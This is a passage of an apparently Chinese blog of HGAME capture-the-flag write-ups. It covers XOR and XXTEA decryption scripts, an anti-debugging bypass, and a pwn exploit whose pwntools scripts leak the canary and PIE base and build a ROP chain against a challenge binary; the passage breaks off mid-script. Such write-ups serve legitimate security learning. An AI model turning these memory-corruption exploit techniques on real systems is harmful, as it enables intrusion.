<p>我觉得这题主要是动调吧，调了很久</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">A = <span class="string">&#x27;hgame&#123;&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">36</span>+ <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x3B</span>, <span class="number">0x02</span>, <span class="number">0x17</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, <span class="number">0x5B</span>, <span class="number">0x4A</span>, <span class="number">0x52</span>, <span class="number">0x4D</span>, <span class="number">0x11</span>,</span><br><span class="line">            <span class="number">0x11</span>, <span class="number">0x4B</span>, <span class="number">0x5C</span>, <span class="number">0x43</span>, <span class="number">0x0A</span>, <span class="number">0x13</span>, <span class="number">0x54</span>, <span class="number">0x12</span>, <span class="number">0x46</span>, <span class="number">0x44</span>,</span><br><span class="line">            <span class="number">0x53</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x11</span>, <span class="number">0x0C</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x37</span>, <span class="number">0x30</span>, <span class="number">0x48</span>,</span><br><span class="line">            <span class="number">0x15</span>, <span class="number">0x07</span>, <span class="number">0x5A</span>, <span class="number">0x46</span>, <span class="number">0x15</span>, <span class="number">0x54</span>, <span class="number">0x1B</span>, <span class="number">0x10</span>, <span class="number">0x43</span>, <span class="number">0x40</span>,</span><br><span class="line">            <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x5A</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x53</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x20</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x79</span>, <span class="number">0x73</span>,</span><br><span class="line">            <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x27</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x72</span>, <span class="number">0x69</span>,</span><br><span class="line">            <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x74</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">43</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i] ^ key[i % <span class="number">28</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="尊嘟假嘟-复现"><a href="#尊嘟假嘟-复现" class="headerlink" title="尊嘟假嘟[复现]"></a>尊嘟假嘟[复现]</h3><p>jadx打开</p>
<p>在Toast发现check，DexCall发现加载了check和dex，GPT说这个类是漏洞点</p>
<p>声明 native 方法 <code>copyDexFromAssets</code>，用于从 APK assets 中复制 DEX 文件到缓存目录。</p>
<p>利用 <code>DexClassLoader</code> 加载复制后的 DEX 文件，反射调用指定类和方法，并传入一个参数。</p>
<p>调用结束后删除 DEX 文件，防止残留。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250221151939637.png" alt="image-20250221151939637"></p>
<p>这里其实方法有很多</p>
<ol>
<li><p>frida hook loadDexFile通杀动态加载dex</p>
</li>
<li><p>修改smali，不让dex删除</p>
</li>
<li><p>分析so算法，进行解密</p>
</li>
<li><p>内存dump</p>
</li>
</ol>
<p>到这留着，安卓还不太会，回头有空再搞</p>
<h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224145630466.png" alt="image-20250224145630466"></p>
<p>下断点得到的key是错的，软件断点的原理是用一条软件断点指令替代断点地址所在位置的操作码字节</p>
<p>因为有反调试,能发现下面部分</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224145751027.png" alt="image-20250224145751027"></p>
<p>qword_1400BB880即为delta，Dr寄存器是调试寄存器，储存硬件断点，也就是说delta为0时才是正常状态</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224150006969.png" alt="image-20250224150006969"></p>
<p>多按几次d就行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224150852773.png" alt="image-20250224150852773"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        rounds = <span class="number">11</span>;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">11</span>;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[] = &#123; <span class="number">0x3050EA23</span>, <span class="number">0x47514C00</span>, <span class="number">0x2B769CEE</span>, <span class="number">0x1794E6D5</span>, <span class="number">0xB3E42BED</span>, <span class="number">0x61D536CB</span>, <span class="number">0x7CA0C2C0</span>, <span class="number">0x5ED767FE</span>,</span><br><span class="line">        <span class="number">0xC579E0AF</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">0x97A25FB5</span>, <span class="number">0xE1756DBA</span>, <span class="number">0xA143464A</span>, <span class="number">0x5A8F284F</span> &#125;;</span><br><span class="line"></span><br><span class="line">    btea(v, <span class="number">-9</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>, *((<span class="type">char</span>*)&amp;v[i] + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v[i] + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v[i] + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v[i] + <span class="number">3</span>));</span><br><span class="line">    <span class="comment">// printf(&quot;%s&quot;,v);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3fe4722c-1dbf-43b7-8659-c1c4a0e42e4d</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="counting-petals"><a href="#counting-petals" class="headerlink" title="counting petals"></a>counting petals</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204204959401.png" alt="image-20250204204959401"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-9Ch]</span></span><br><span class="line">  __int64 v7[<span class="number">17</span>]; <span class="comment">// [rsp+18h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+A0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+A4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = rand() % <span class="number">30</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nAs we know,there&#x27;s a tradition to determine whether someone loves you or not...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;... by counting flower petals when u are not sure.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nHow many flowers have you prepared this time?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v8);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nNo matter how many flowers there are, they cannot change the fact of whether he or she loves you.&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Just a few flowers will reveal the answer,love fool.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nTell me the number of petals in each flower.&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( v9 &lt; v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;the flower number %d : &quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)++v9);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v7[v9 + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nDo you want to start with &#x27;love me&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;...or &#x27;not love me&#x27;?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v7);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nSometimes timing is important, so I added a little bit of randomness.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nLet&#x27;s look at the results.&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld + &quot;</span>, v7[++v5 + <span class="number">1</span>]);</span><br><span class="line">      v7[<span class="number">0</span>] += v7[v5 + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v6);</span><br><span class="line">    v7[<span class="number">0</span>] += v6;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; = &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (v7[<span class="number">0</span>] &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;He or she doesn&#x27;t love you.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What a pity!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I can give you just ONE more chance.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wish that this time they love you.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations,he or she loves you.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面那个似乎有点怪，1的时候却是填在2中，看看能不能覆盖什么，调试下看吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;the flower number %d : &quot;, (unsigned int)++v9);</span><br><span class="line">__isoc99_scanf(&quot;%ld&quot;, &amp;v7[v9 + 1]);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250206172921831.png" alt="image-20250206172921831"></p>
<p>第一次输入2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250206173216637.png" alt="image-20250206173216637"></p>
<p>输入3</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250206173336641.png" alt="image-20250206173336641"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250206173502680.png" alt="image-20250206173502680"></p>
<p>这么看的话输入16能覆盖到0xf</p>
<p>但是发现直接覆盖会重复执行循环</p>
<p>发现如下</p>
<p>0xb00000010</p>
<p>B是v9，010是输入的16也就是v9和v8是在相近的地址上，不能直接覆盖</p>
<p>需要泄露PIE地址,canary的话那么看到ld发现我们可以输入一个大数被转化成16进制</p>
<p>如64424509455被转为0xe0000000f</p>
<p>那么就能多泄露几个(靠下面的+print出来)</p>
<p>Canary</p>
<p>0x5752a16272660200</p>
<p>我设置了：0x1100000011</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    io = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node1.hgame.vidar.club&quot;</span>, <span class="number">32226</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; time?&quot;</span>, <span class="string">b&quot;16&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, <span class="built_in">str</span>(<span class="number">94489280534</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;latter:&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析输出泄露Canary</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;the results.&quot;</span>)</span><br><span class="line">output = io.recvuntil(<span class="string">b&quot; = \n&quot;</span>).split(<span class="string">b&#x27; + &#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(output[-<span class="number">7</span>])  </span><br><span class="line">ret_addr = <span class="built_in">int</span>(output[-<span class="number">5</span>])  </span><br><span class="line">main_pie_addr = <span class="built_in">int</span>(output[-<span class="number">3</span>])  </span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;ret_addr: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;main_pie_addr: <span class="subst">&#123;<span class="built_in">hex</span>(main_pie_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pie_base = main_pie_addr - <span class="number">0x12BF</span>  <span class="comment"># 替换为实际偏移</span></span><br><span class="line">log.success(<span class="string">f&quot;PIE Base: <span class="subst">&#123;<span class="built_in">hex</span>(pie_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;puts_plt: <span class="subst">&#123;<span class="built_in">hex</span>(puts_plt)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;puts_got: <span class="subst">&#123;<span class="built_in">hex</span>(puts_got)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = pie_base + <span class="number">0x2a3e5</span>      <span class="comment"># 例如: &quot;pop rdi; ret&quot; 的偏移</span></span><br><span class="line">puts_plt    = pie_base + puts_plt       <span class="comment"># binary 的 puts@plt 地址</span></span><br><span class="line">puts_got    = pie_base + puts_got      <span class="comment"># binary 的 puts@got 地址</span></span><br><span class="line">main_addr   = pie_base + <span class="number">0x12BF</span>        <span class="comment"># main 的实际地址</span></span><br><span class="line"></span><br><span class="line">rop = flat([</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    puts_got,</span><br><span class="line">    puts_plt,</span><br><span class="line">    main_addr</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250207193028775.png" alt="image-20250207193028775"></p>
<p>的确泄露了，那么问题来了如何执行呢我们的代码呢??rop根本无法执行，我们输入不了那么多</p>
<blockquote>
<p>学到了，不要一味的写，先把问题考虑清楚再开始做</p>
</blockquote>
<p>后来想到我们不用控制v9，我们只要输入比如1000，他后面就能溢出了(当然原来的方法仍然可用于泄露，但是执行就不适用了)</p>
<p>直接贴exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    io = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node1.hgame.vidar.club&quot;</span>, <span class="number">32226</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; time?&quot;</span>, <span class="string">b&quot;16&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, 